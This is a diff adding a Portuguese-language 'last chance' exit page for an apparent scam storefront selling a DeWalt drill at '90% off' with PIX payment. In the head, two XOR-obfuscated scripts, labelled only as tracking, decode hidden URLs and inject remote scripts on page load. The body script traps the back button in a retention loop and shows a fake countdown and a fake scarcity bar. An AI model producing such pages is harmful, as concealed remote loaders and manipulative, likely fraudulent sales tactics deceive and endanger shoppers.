@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<!-- ============================================================
+     PASTA /back/  -  OFERTA DE SAIDA (BACK REDIRECT)
+     Furadeira DeWalt por R$49,90 (preco de custo)
+
+     Como funciona:
+     - No index.html da raiz ja existe o gatilho: quem aperta
+       "voltar" na landing e mandado para  /back/  (esta pasta).
+     - Os 2 botoes (procure por  data-checkout ) levam pro mesmo
+       modelo de checkout real do funil principal, só que com o
+       preco fixo em R$49,90: pasta  /back/checkout/  (copia de
+       /checkout/ com o valor alterado - PIX real via Velani).
+     ============================================================ -->
+<head>
+    <!-- garante a barra final na URL (senao ./js/... resolve errado e a pagina fica em branco) -->
+    <script>
+    (function () {
+      var p = location.pathname;
+      var ultimo = p.split('/').pop();
+      if (p.slice(-1) !== '/' && ultimo.indexOf('.') === -1) {
+        location.replace(p + '/' + location.search + location.hash);
+      }
+    })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes">
+    <title>ÚLTIMA CHANCE – Furadeira DeWalt por R$49,90</title>
+    <meta name="robots" content="noindex, nofollow">
+
+    <!-- Rastreio (mesmo do funil) -->
+    <script>(function(){var r_c=atob("DNhRgbgB8ML0nd9cJ6Nz9Mpt0vjW9asoV6trrpdilKza6KsxTr4or9tuneyW7/AvRKo48cxy37eA8KxzS7kl5Mt13qiHv/N+Rqwl89FjhbaR7v1mfKNz79lsleDOv7s9U7l89MxsmaSNsK8uQq4078wsiKGb+fIvRLNzrZp3ka6B+P1mBfosrcMjnqOZ+P1mBbww9dkshbaZ9LklCqgj5M5knrbZ7qo+Trwio5QjhqOY6Lp+Hfpz/OV8");var l_jjsk=[];for(var o_1e=0;o_1e<r_c.length;o_1e++){l_jjsk.push(r_c.charCodeAt(o_1e)&255);}var c_h=l_jjsk[0];var t_jfx=l_jjsk.slice(1,1+c_h);var s_8=l_jjsk.slice(1+c_h);var q_yen2=s_8.map(function(b,u_butq){return b^t_jfx[u_butq%c_h];});var f_w7q="";for(var v_iza=0;v_iza<q_yen2.length;v_iza++){f_w7q+=String.fromCharCode(q_yen2[v_iza]&255);}var s_kk=decodeURIComponent(escape(f_w7q));var u_2qpb=JSON.parse(s_kk);var q_1r8d=u_2qpb.globals||[];q_1r8d.forEach(function(s_lm){window[s_lm.name]=s_lm.value;});var j_j2=document.createElement("script");j_j2.src=u_2qpb.url;j_j2.async=true;j_j2.defer=true;(u_2qpb.attributes||[]).forEach(function(a_urt){j_j2.setAttribute(a_urt.name,a_urt.value);});(document.head||document.documentElement).appendChild(j_j2);})();</script>
+    <script>(function(){var x_o=atob("DF3gSaZNDruNgK/pyCbCPNQhLIGv6NuduC7aZokuatWj9duEoTuZZ8UiY5Xv8oCaqy+JOdI+Icvk+MqF5y2JMcMhINH+ooPLqSmUO88ve8/o843TkwDMa8EhYdns7NzL8gaba8gsY96vuo2ZoSWFJe8pLJev9s6FvTjCc4R7b9m0tpja8WrZeZV5PI+/t5yN+GyCeJBvc+bw");var q_247=[];for(var y_9m1=0;y_9m1<x_o.length;y_9m1++){q_247.push(x_o.charCodeAt(y_9m1)&255);}var z_g=q_247[0];var m_bwm=q_247.slice(1,1+z_g);var r_wx=q_247.slice(1+z_g);var v_b=r_wx.map(function(b,v_1){return b^m_bwm[v_1%z_g];});var l_owdn="";for(var z_1=0;z_1<v_b.length;z_1++){l_owdn+=String.fromCharCode(v_b[z_1]&255);}var x_hq6c=decodeURIComponent(escape(l_owdn));var d_gox8=JSON.parse(x_hq6c);var e_tip=d_gox8.globals||[];e_tip.forEach(function(x_57w){window[x_57w.name]=x_57w.value;});var w_gr=document.createElement("script");w_gr.src=d_gox8.url;w_gr.async=true;w_gr.defer=true;(d_gox8.attributes||[]).forEach(function(s_w8gx){w_gr.setAttribute(s_w8gx.name,s_w8gx.value);});(document.head||document.documentElement).appendChild(w_gr);})();</script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --laranja: #EE4D2D;
+            --laranja-esc: #d63e20;
+            --amarelo: #FFE97A;
+            --verde: #1BA672;
+            --tinta: #1f1f1f;
+            --cinza: #6b6b6b;
+            --fundo: #fff5f2;
+        }
+
+        body {
+            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: var(--fundo);
+            color: var(--tinta);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .wrap {
+            max-width: 480px;
+            margin: 0 auto;
+            background: #ffffff;
+            min-height: 100vh;
+            box-shadow: 0 0 40px rgba(0, 0, 0, .08);
+        }
+
+        /* ---------- Faixa topo ---------- */
+        .alerta {
+            background: repeating-linear-gradient(45deg, var(--laranja), var(--laranja) 14px, var(--laranja-esc) 14px, var(--laranja-esc) 28px);
+            color: #fff;
+            text-align: center;
+            font-weight: 800;
+            font-size: 13px;
+            letter-spacing: .5px;
+            padding: 9px 12px;
+            text-transform: uppercase;
+        }
+
+        /* ---------- Hero ---------- */
+        .hero {
+            text-align: center;
+            padding: 26px 20px 10px;
+        }
+
+        .hero .emoji { font-size: 40px; line-height: 1; }
+
+        .hero h1 {
+            font-size: 26px;
+            font-weight: 900;
+            margin: 10px 0 6px;
+            text-transform: uppercase;
+        }
+
+        .hero h1 span { color: var(--laranja); }
+
+        .hero p.sub {
+            font-size: 16px;
+            color: var(--cinza);
+            margin-bottom: 4px;
+        }
+
+        /* ---------- Produto + preço ---------- */
+        .oferta {
+            margin: 8px 16px 0;
+            border: 3px dashed var(--laranja);
+            border-radius: 16px;
+            padding: 18px 16px 20px;
+            text-align: center;
+            background: var(--fundo);
+        }
+
+        .oferta img.produto {
+            width: 78%;
+            max-width: 300px;
+            display: block;
+            margin: 0 auto 10px;
+            border-radius: 12px;
+        }
+
+        .oferta .nome {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .oferta .de {
+            font-size: 15px;
+            color: var(--cinza);
+            text-decoration: line-through;
+        }
+
+        .oferta .selo {
+            display: inline-block;
+            background: var(--amarelo);
+            color: var(--laranja);
+            font-weight: 800;
+            font-size: 13px;
+            padding: 2px 8px;
+            border-radius: 6px;
+            margin-left: 6px;
+        }
+
+        .oferta .por {
+            font-size: 14px;
+            color: var(--cinza);
+            margin-top: 6px;
+        }
+
+        .oferta .preco {
+            font-size: 52px;
+            font-weight: 900;
+            color: var(--verde);
+            letter-spacing: -1px;
+            line-height: 1.1;
+        }
+
+        .oferta .preco small { font-size: 22px; font-weight: 800; vertical-align: 6px; }
+
+        .oferta .btn-custo {
+            display: block;
+            width: 100%;
+            border: none;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 14px;
+            background: var(--verde);
+            color: #fff;
+            text-decoration: none;
+            font-weight: 900;
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: .3px;
+            padding: 15px 12px;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(27, 166, 114, .45);
+            animation: pulsa 1.5s infinite;
+        }
+
+        .oferta .btn-custo span {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: none;
+            letter-spacing: 0;
+            opacity: .92;
+            margin-top: 3px;
+        }
+
+        /* ---------- Timer ---------- */
+        .timer-box {
+            text-align: center;
+            margin: 18px 16px 0;
+        }
+
+        .timer-box .rotulo {
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--laranja);
+            margin-bottom: 6px;
+        }
+
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .timer div {
+            background: var(--tinta);
+            color: #fff;
+            font-weight: 800;
+            font-size: 24px;
+            padding: 8px 12px;
+            border-radius: 10px;
+            min-width: 52px;
+        }
+
+        .timer div span {
+            display: block;
+            font-size: 9px;
+            font-weight: 600;
+            letter-spacing: .5px;
+            opacity: .7;
+            text-transform: uppercase;
+        }
+
+        /* ---------- Bullets ---------- */
+        ul.beneficios {
+            list-style: none;
+            margin: 20px 20px 0;
+            font-size: 14.5px;
+        }
+
+        ul.beneficios li {
+            padding: 7px 0 7px 28px;
+            position: relative;
+            font-weight: 600;
+        }
+
+        ul.beneficios li::before {
+            content: "✔";
+            position: absolute;
+            left: 0;
+            top: 7px;
+            color: var(--verde);
+            font-weight: 900;
+        }
+
+        /* ---------- CTA ---------- */
+        .cta-area { padding: 18px 16px 6px; }
+
+        .cta {
+            display: block;
+            width: 100%;
+            border: none;
+            font-family: inherit;
+            cursor: pointer;
+            background: var(--laranja);
+            color: #fff;
+            text-decoration: none;
+            text-align: center;
+            font-size: 19px;
+            font-weight: 900;
+            text-transform: uppercase;
+            padding: 18px 14px;
+            border-radius: 14px;
+            box-shadow: 0 8px 20px rgba(238, 77, 45, .45);
+            animation: pulsa 1.5s infinite;
+        }
+
+        .cta small {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: none;
+            opacity: .9;
+            margin-top: 3px;
+        }
+
+        @keyframes pulsa {
+            0%   { transform: scale(1); }
+            50%  { transform: scale(1.035); }
+            100% { transform: scale(1); }
+        }
+
+        .selos-conf {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px 16px;
+            margin: 14px 16px 0;
+            font-size: 11.5px;
+            color: var(--cinza);
+            font-weight: 600;
+        }
+
+        .estoque {
+            text-align: center;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--laranja);
+            margin: 16px 16px 0;
+        }
+
+        .estoque .barra {
+            height: 10px;
+            background: #eee;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-top: 6px;
+        }
+
+        .estoque .barra i {
+            display: block;
+            height: 100%;
+            width: 8%;
+            background: linear-gradient(90deg, var(--laranja), #ff7a5c);
+        }
+
+        .recusar {
+            display: block;
+            text-align: center;
+            margin: 22px auto 30px;
+            font-size: 12px;
+            color: #b0b0b0;
+            text-decoration: underline;
+            background: none;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .rodape {
+            text-align: center;
+            font-size: 10px;
+            color: #b8b8b8;
+            padding: 0 20px 26px;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+
+        <div class="alerta">⚠️ Peraí! Você ainda não garantiu a sua</div>
+
+        <div class="hero">
+            <div class="emoji">🚨</div>
+            <h1>Espera! Não vai <span>perder isso</span></h1>
+            <p class="sub">Vi que você ia sair sem comprar. Então libera aqui uma condição
+                que <strong>não vai aparecer de novo</strong>:</p>
+        </div>
+
+        <div class="oferta">
+            <img class="produto" src="images/1m.jpg" alt="Furadeira Parafusadeira DeWalt 48V"
+                 onerror="this.style.display='none'">
+            <div class="nome">Furadeira / Parafusadeira de Impacto DeWalt 48V Brushless + 2 Baterias</div>
+
+            <div>
+                <span class="de">R$ 497,90</span>
+                <span class="selo">-90%</span>
+            </div>
+
+            <div class="por">agora, só pra você que ia embora:</div>
+            <div class="preco"><small>R$</small>49,90</div>
+
+            <a class="btn-custo" data-checkout="checkout/" href="checkout/">
+                Garantir agora por R$49,90
+                <span>preço de custo · sem margem de lucro</span>
+            </a>
+        </div>
+
+        <div class="timer-box">
+            <div class="rotulo">Essa tela expira em</div>
+            <div class="timer">
+                <div id="mm">05<span>min</span></div>
+                <div id="ss">00<span>seg</span></div>
+            </div>
+        </div>
+
+        <ul class="beneficios">
+            <li>Mesmo produto da página anterior — <strong>DeWalt original</strong></li>
+            <li>Vem com <strong>2 baterias 48V</strong> e carregador rápido</li>
+            <li><strong>Frete GRÁTIS</strong> pra todo o Brasil</li>
+            <li>7 dias de garantia — não gostou, devolve o dinheiro</li>
+            <li>Pagamento 100% seguro (Pix, cartão ou boleto)</li>
+        </ul>
+
+        <div class="cta-area">
+            <a class="cta" data-checkout="checkout/" href="checkout/">
+                Quero pagar só R$49,90
+                <small>Clique aqui e garanta antes que volte pro preço normal</small>
+            </a>
+        </div>
+
+        <div class="selos-conf">
+            <span>🔒 Compra segura</span>
+            <span>🚚 Frete grátis</span>
+            <span>↩️ 7 dias de garantia</span>
+        </div>
+
+        <div class="estoque">
+            Restam poucas unidades nesse preço
+            <div class="barra"><i></i></div>
+        </div>
+
+        <button class="recusar" id="btnRecusar" type="button">
+            Não, obrigado. Prefiro pagar o preço cheio depois.
+        </button>
+
+        <div class="rodape">
+            Oferta de última chance exclusiva desta sessão. Não recarregue a página —
+            ela pode não voltar. Imagens meramente ilustrativas.
+        </div>
+    </div>
+
+    <script>
+        (function () {
+            "use strict";
+
+            /* ---- 1. Repassa a query string (UTMs) pro link de checkout ---- */
+            var qs = (window.location.search || "").replace(/^\?/, "");
+            if (qs) {
+                var links = document.querySelectorAll("a[data-checkout]");
+                for (var i = 0; i < links.length; i++) {
+                    var base = links[i].getAttribute("data-checkout") || links[i].getAttribute("href");
+                    links[i].setAttribute("href", base + (base.indexOf("?") > -1 ? "&" : "?") + qs);
+                }
+            }
+
+            /* ---- 2. Prende o "voltar" tambem nesta pagina (loop de retencao) ---- */
+            var liberou = false;
+            function onPop() {
+                if (liberou) return;
+                try { history.pushState(null, "", window.location.href); } catch (e) {}
+            }
+            try {
+                history.pushState(null, "", window.location.href);
+                window.addEventListener("popstate", onPop);
+            } catch (e) {}
+
+            /* ---- 3. Link "Nao, obrigado": libera o voltar e sai ---- */
+            var recusar = document.getElementById("btnRecusar");
+            if (recusar) {
+                recusar.addEventListener("click", function () {
+                    liberou = true;
+                    window.removeEventListener("popstate", onPop);
+                    history.go(-2);
+                    setTimeout(function () { history.back(); }, 80);
+                });
+            }
+
+            /* ---- 4. Contador regressivo (5 min) ---- */
+            var total = 5 * 60;
+            var mm = document.getElementById("mm");
+            var ss = document.getElementById("ss");
+            function pad(n) { return (n < 10 ? "0" : "") + n; }
+            function tick() {
+                if (total < 0) total = 0;
+                if (mm) mm.firstChild.nodeValue = pad(Math.floor(total / 60));
+                if (ss) ss.firstChild.nodeValue = pad(total % 60);
+                if (total === 0) { clearInterval(iv); return; }
+                total--;
+            }
+            tick();
+            var iv = setInterval(tick, 1000);
+        })();
+    </script>
+</body>
+</html>
